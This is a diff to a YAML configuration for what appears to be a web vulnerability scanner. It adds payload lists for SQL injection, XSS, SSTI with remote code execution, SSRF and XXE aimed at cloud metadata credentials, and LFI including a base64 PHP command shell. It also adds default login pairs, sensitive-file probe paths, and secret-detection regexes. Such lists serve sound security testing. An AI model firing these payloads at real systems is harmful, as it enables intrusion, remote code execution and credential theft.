@@ -1,22 +1,65 @@
 # Access Control Tester
 access_control:
   paths:
+    # Common Admin Panels
     - "/admin"
+    - "/administration"
     - "/admin/"
     - "/dashboard"
+    - "/admin/dashboard"
+    - "/manage"
+    - "/manager"
+    - "/controlpanel"
+    - "/cpanel"
+    - "/admin.php"
+    - "/admin.html"
+    - "/admin-login"
+    - "/webadmin"
+    - "/phpmyadmin"
+    # Config & Sensitive Files
     - "/config"
     - "/.git/"
+    - "/.git/config"
     - "/.env"
+    - "/.env.local"
+    - "/.env.production"
+    - "/config.json"
+    - "/web.config"
+    - "/appsettings.json"
+    - "/docker-compose.yml"
+    - "/package.json"
+    # Backup & Log Files
     - "/backup/"
+    - "/backup.zip"
+    - "/backup.tar.gz"
+    - "/site.zip"
+    - "/database.sql"
+    - "/app.log"
+    - "/error.log"
+    - "/debug.log"
+    # Cloud & API
     - "/.aws/credentials"
     - "/api/users"
+    - "/api/v1/users"
+    - "/.well-known/security.txt"
+    # Path Traversal
     - "/../../../../etc/passwd"
+    - "/../../../../../windows/win.ini"
+    # CMS Specific
+    - "/wp-admin/"
+    - "/administrator/"
+    - "/user/login"
+    - "/backend"
+    - "/_ignition/health-check" # Laravel Debug
+    - "/_profiler/" # Symfony Debug
   forbidden_keywords:
     - "unauthorized"
     - "forbidden"
     - "access denied"
     - "permission denied"
     - "404 not found"
+    - "404"
+    - "403"
 
 # Authentication Tester
 auth:
@@ -25,17 +68,21 @@ auth:
     - { user: "admin", pass: "password" }
     - { user: "root", pass: "root" }
     - { user: "test", pass: "test" }
+    - { user: "administrator", pass: "administrator" }
+    - { user: "admin", pass: "1234" }
+    - { user: "admin", pass: "admin123" }
+    - { user: "user", pass: "user" }
   sensitive_path_keywords:
     - "reset-password"
     - "change-password"
     - "2fa"
     - "mfa"
   login_form_indicators: ["login", "signin", "authenticate"]
-  login_success_indicators: ["logout", "sign-out", "dashboard", "my account"]
+  login_success_indicators: ["logout", "sign-out", "dashboard", "my account","sign out","successful"]
 
 # CSRF Tester
 csrf:
-  token_names: ["csrf", "_token", "xsrf", "authenticity_token"]
+  token_names: ["csrf", "_token", "xsrf", "authenticity_token", "nonce"]
 
 # Crypto Tester
 crypto:
@@ -54,30 +101,163 @@ info_leak:
     - { type: "Email Address", regex: '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b', severity: "Low", subcategory: "Email Address" }
     - { type: "JWT Token", regex: '\beyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]*\b', severity: "High", subcategory: "Exposed Credentials" }
     - { type: "AWS Access Key ID", regex: '\bAKIA[0-9A-Z]{16}\b', severity: "Critical", subcategory: "Cloud Credentials" }
+    - { type: "AWS Secret Key", regex: '\b[A-Za-z0-9/+=]{40}\b', min_entropy: 3.5, severity: "Critical", subcategory: "Cloud Credentials" }
     - { type: "Google API Key", regex: '\bAIza[0-9A-Za-z\-_]{35}\b', severity: "High", subcategory: "Exposed Credentials" }
     - { type: "GitHub Token", regex: '\bghp_[A-Za-z0-9]{36}\b', severity: "High", subcategory: "Exposed Credentials" }
-
+    - { type: "Stripe API Key", regex: '\b(sk|pk)_(test|live)_[0-9a-zA-Z]{24}\b', severity: "Critical", subcategory: "Payment Credentials" }
+    - { type: "Private Key", regex: '-----BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY-----', severity: "Critical", subcategory: "Exposed Private Key" }
 # Integrity Tester
 integrity:
   trusted_domains: ["cdnjs.cloudflare.com", "ajax.googleapis.com", "cdn.jsdelivr.net", "maxcdn.bootstrapcdn.com", "code.jquery.com"]
 
 # Local File Inclusion Tester
 lfi:
-  payloads: ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/proc/self/environ"]
-  indicators: ["root:x:0:0:", "[extensions]", "PATH=", "[boot loader]"]
+  payloads:
+    - "../../../../etc/passwd"
+    - "..\\..\\..\\windows\\win.ini"
+    - "/proc/self/environ"
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+    - "/var/log/apache2/access.log"
+    - "C:/xampp/apache/logs/access.log"
+    - "/etc/hosts"
+  indicators: ["root:x:0:0:", "[extensions]", "PATH=", "[boot loader]", "127.0.0.1\tlocalhost"]
 
 # Logging Tester
 logging:
-  paths: ["/error.log", "/debug.log", "/access.log", "/server.log", "/app.log"]
+  paths: ["/error.log", "/debug.log", "/access.log", "/server.log", "/app.log", "/logs/laravel.log", "/storage/logs/laravel.log", "/var/log/nginx/error.log"]
   sensitive_patterns:
     - { regex: 'password\s*[:=]\s*\S+', description: "Password Leak" }
     - { regex: 'Authorization:\s*Bearer\s+\S+', description: "Authorization Token Leak" }
     - { regex: 'api_key\s*[:=]\s*\S+', description: "API Key Leak" }
-  debug_keywords: ["stack trace", "traceback", "exception", "debug mode"]
+  debug_keywords: ["stack trace", "traceback", "exception", "debug mode", "whoops", "ErrorException"]
 
-# Miscellaneous Tester
+# SQL Injection Tester
+sqli:
+  error_based_payloads:
+    - "'"
+    - "\""
+    - "`"
+    - "1'"
+    - "1\""
+    - "1`"
+    - "' OR 1=1--"
+    - "\" OR 1=1--"
+    - "` OR 1=1--"
+    - "' OR 'a'='a"
+    - "') OR ('a'='a"
+    - "')) OR (('a'='a"
+    - "ORDER BY 1--"
+    - "ORDER BY 99--"
+    - "UNION SELECT 1--"
+    - "UNION SELECT NULL--"
+    - "UNION SELECT NULL,NULL--"
+    - "UNION SELECT NULL,NULL,NULL--"
+    - "AND 1=0 UNION SELECT NULL,NULL--"
+    - "1' AND 1=1--"
+    - "1' AND 1=2--"
+    - "' AND extractvalue(1, concat(0x7e, @@version))--"
+    - "'; SELECT pg_sleep(5)--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+  time_based_payloads:
+    - "' OR SLEEP(5)--"
+    - "\" OR SLEEP(5)--"
+    - "1' OR SLEEP(5)--"
+    - "1); SELECT pg_sleep(5)--"
+    - "AND (SELECT 2174 FROM (SELECT(SLEEP(5)))mSCh)"
+    - "IF(1=1, SLEEP(5), 0)"
+  boolean_based_payloads:
+    - { true: "' AND 1=1--", false: "' AND 1=2--" }
+    - { true: "' OR 1=1--", false: "' OR 1=2--" }
+  error_patterns: ["sql syntax", "mysql", "unclosed quotation", "syntax error", "ora-", "postgresql", "sql server", "invalid column", "unknown column"]
+  time_delay_seconds: 4
+
+# Server-Side Request Forgery Tester
+ssrf:
+  payloads:
+    - { payload: "http://169.254.169.254/latest/meta-data/", indicator: "instance-id", subcategory: "Cloud Metadata" }
+    - { payload: "http://127.0.0.1/admin", indicator: "dashboard", subcategory: "Local Network" }
+    - { payload: "http://localhost:8080", indicator: "Tomcat", subcategory: "Local Service" }
+    - { payload: "http://metadata.google.internal/computeMetadata/v1/", indicator: "instance/", subcategory: "GCP Metadata" }
+    - { payload: "file:///etc/passwd", indicator: "root:x:0:0", subcategory: "Local File" }
+    - { payload: "file:///c:/windows/win.ini", indicator: "[extensions]", subcategory: "Local File" }
+    - { payload: "http://[::]:80/", indicator: "html", subcategory: "IPv6 Loopback" }
+    - { payload: "http://127.1/", indicator: "html", subcategory: "IP Obfuscation" }
+
+# Server-Side Template Injection Tester
+ssti:
+  payloads:
+    - { payload: "{{7*7}}", response: "49", engine: "Jinja2/Twig", subcategory: "Expression Evaluation" }
+    - { payload: "${7*7}", response: "49", engine: "FreeMarker/Velocity", subcategory: "Expression Evaluation" }
+    - { payload: "<%= 7*7 %>", response: "49", engine: "ERB (Ruby)", subcategory: "Expression Evaluation" }
+    - { payload: "#{7*7}", response: "49", engine: "JSF/Groovy", subcategory: "Expression Evaluation" }
+    - { payload: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", response: "uid=", engine: "Jinja2 RCE", subcategory: "Command Execution" }
+    - { payload: "${'a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id').getInputStream().read()}", response: "uid=", engine: "FreeMarker RCE", subcategory: "Command Execution" }
+
+# Cross-Site Scripting (XSS) Tester
+xss:
+  payloads:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "'\"><svg/onload=alert('XSS')>"
+    - "<svg onload=alert(1)>"
+    - "<iframe src=\"javascript:alert('XSS');\">"
+    - "<a href=\"javascript:alert('XSS')\">Click me</a>"
+    - "javascript:alert('XSS')"
+    - "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+    - "';alert('XSS');'"
+    - "\";alert('XSS');"
+    - "onerror=alert('XSS')"
+    - "autofocus onfocus=alert('XSS')"
+    - "<details open ontoggle=alert('XSS')>"
+    - "<body onload=alert('XSS')>"
+    - "<video><source onerror=\"javascript:alert('XSS')\">"
+    - "<div style=\"width:100%;height:100%;\" onmouseover=alert('XSS')></div>"
+    - "'\"--></style></scRipt><scRipt>alert('XSS')</scRipt>"
+    - "<scr<script>ipt>alert('XSS')</scr<script>ipt>"
+    - "javascript://%250Aalert('XSS')"
+
+# DOM-based XSS Configuration
+dom_xss:
+  payloads:
+    - "<script>alert('DOMXSS')</script>"
+    - "javascript:alert('DOMXSS')"
+    - "<img src=x onerror=alert('DOMXSS')>"
+    - "\"><svg/onload=alert('DOMXSS')>"
+    - "#<script>alert('DOMXSS')</script>"
+    - "{{constructor.constructor('alert(\"DOMXSS\")')()}}"
+    - "eval(atob('YWxlcnQoJ0RPTVhTUycp'))"
+
+# XML External Entity Tester
+xxe:
+  endpoint_keywords: ["/api", "/soap", "/xml", ".xml", ".wsdl", ".rss"]
+  payloads:
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>', subcategory: "SSRF via XXE" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM "http://example.com/evil.dtd"><%dtd;]><foo></foo>', subcategory: "External DTD" }
+  indicators: ["root:x:0:0:", "www-data:", "daemon:", "instance-id"]
+
+# API Scanner Configuration
+api:
+  swagger_paths:
+    - "/swagger.json"
+    - "/api/swagger.json"
+    - "/swagger-ui.html"
+    - "/openapi.json"
+    - "/openapi.yaml"
+    - "/api/docs"
+    - "/v2/api-docs"
+    - "/v3/api-docs"
+    - "/docs"
+
+# Outdated Component (We have Retire.js now)
+outdated_component:
+  libraries: []
+
+# Misc Tester
 misc:
-  error_keywords: ["stack trace", "traceback", "exception", "fatal error", "debug mode"]
+  error_keywords: ["stack trace", "traceback", "exception", "fatal error", "debug mode", "whoops", "ErrorException"]
   security_policy:
     path_keywords: ["security.txt", "security-policy"]
     sensitive_terms: ["vulnerability", "exploit", "leak", "poc"]
@@ -89,70 +269,3 @@ misc:
     content_keywords: ["admin", "ctf"]
   chatbot:
     path_keywords: ["/chatbot/kill", "/chatbot/disable"]
-
-# Outdated Component Tester
-outdated_component:
-  libraries:
-    - { name: "jQuery", regex: 'jQuery v([0-9.]+)', latest: "3.7.1" }
-    - { name: "Bootstrap", regex: 'Bootstrap v([0-9.]+)', latest: "5.3.3" }
-    - { name: "AngularJS", regex: 'AngularJS v([0-9.]+)', latest: "1.8.2" }
-    - { name: "React", regex: 'React v([0-9.]+)', latest: "18.2.0" }
-
-# SQL Injection Tester
-sqli:
-  error_based_payloads: ["'", "\"", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--"]
-  time_based_payloads: ["' OR SLEEP(5)--", "' OR BENCHMARK(10000000,MD5(1))--"]
-  boolean_based_payloads:
-    - { true: "' AND 1=1--", false: "' AND 1=2--" }
-  error_patterns: ["sql syntax", "mysql", "unclosed quotation", "syntax error", "ora-"]
-  time_delay_seconds: 4
-
-# Server-Side Request Forgery Tester
-ssrf:
-  payloads:
-    - { payload: "http://169.254.169.254/latest/meta-data/", indicator: "instance-id", subcategory: "Cloud Metadata" }
-    - { payload: "http://127.0.0.1/admin", indicator: "dashboard", subcategory: "Local Network" }
-    - { payload: "file:///etc/passwd", indicator: "root:x:0:0", subcategory: "Local File" }
-
-# Server-Side Template Injection Tester
-ssti:
-  payloads:
-    - { payload: "{{7*7}}", response: "49", engine: "Jinja2/Twig", subcategory: "Expression Evaluation" }
-    - { payload: "${7*7}", response: "49", engine: "FreeMarker", subcategory: "Expression Evaluation" }
-    - { payload: "<%= 7*7 %>", response: "49", engine: "ERB", subcategory: "Expression Evaluation" }
-
-# Cross-Site Scripting Tester
-xss:
-  payloads:
-    - "<script>alert('XSS')</script>"
-    - "<img src=x onerror=alert('XSS')>"
-    - "'\"><svg/onload=alert('XSS')>"
-
-# XML External Entity Tester
-xxe:
-  endpoint_keywords: ["/api", "/soap", "/xml", ".xml", ".wsdl"]
-  payloads:
-    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
-    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
-  indicators: ["root:x:0:0:", "www-data:", "daemon:"]
-
-  # API Scanner Configuration
-  api:
-    swagger_paths:
-      - "/swagger.json"
-      - "/api/swagger.json"
-      - "/swagger-ui.html"
-      - "/openapi.json"
-      - "/api/docs"
-      - "/v2/api-docs"
-      - "/docs"
-
-  # DOM-based XSS Configuration (Payloads chuyên dụng để trigger alert)
-  dom_xss:
-    payloads:
-      - "<script>alert(1)</script>"
-      - "<img src=x onerror=alert(1)>"
-      - "javascript:alert(1)"
-      - "#<script>alert(1)</script>"
-      - "\"><img src=x onerror=alert(1)>"
-      - "{{7*7}}"
